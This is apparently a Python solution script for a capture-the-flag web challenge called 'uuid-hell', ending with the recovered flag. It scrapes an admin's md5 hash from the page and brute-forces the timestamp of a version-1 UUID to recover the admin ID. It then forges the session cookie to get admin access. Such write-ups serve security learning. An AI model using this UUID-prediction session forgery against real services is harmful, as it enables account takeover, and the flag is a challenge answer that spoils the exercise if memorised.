from requests import Session
from uuid import uuid1
from hashlib import md5
# https://github.com/python/cpython/blob/3.11/Lib/uuid.py#L674
def md5_uuid(uuid):
    m = md5()
    m.update(uuid.encode())
    return m.hexdigest()

def find_admin_uuid(adminhash, myuuid):
    ts_low = int(myuuid[0:8], 16)
    for i in range(730000, 8740000):
        ts_l = ts_low  - i
        admin_uuid = hex(ts_l)[2:] + myuuid[8:]
        md5hash = md5_uuid('admin' + admin_uuid)
        if md5hash == adminhash:
            return admin_uuid
    return None

def send_req():
    # node = int.from_bytes(bytes([0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69]), byteorder='big')
    # clock_seq = 0b10101001100100
    # admin_uuid = uuid1(node, clock_seq)
    sess = Session()
    # create an admin, gen a new uuid
    sess.post('https://uuid-hell.lac.tf/createadmin', data = 'f')
    r = sess.get('https://uuid-hell.lac.tf/')
    print(r.text)
    idx = r.text.find('Regular users:')
    if idx == -1:
        print('No regular users found')
        exit(0)
    idx -= 59
    adminhash = r.text[idx:idx+32]
    print(f'Admin hash found: {adminhash}')
    myuuid = r.text[21:21+36]
    print(f'My hash found: {myuuid}')
    admin_uuid = find_admin_uuid(adminhash, myuuid)
    if admin_uuid != None:
        sess1 = Session()
        r = sess1.get('https://uuid-hell.lac.tf/', cookies = {'id': admin_uuid})
        print(r.text)

if __name__ == '__main__':
    send_req()

# lactf{uu1d_v3rs10n_1ch1_1s_n07_r4dn0m}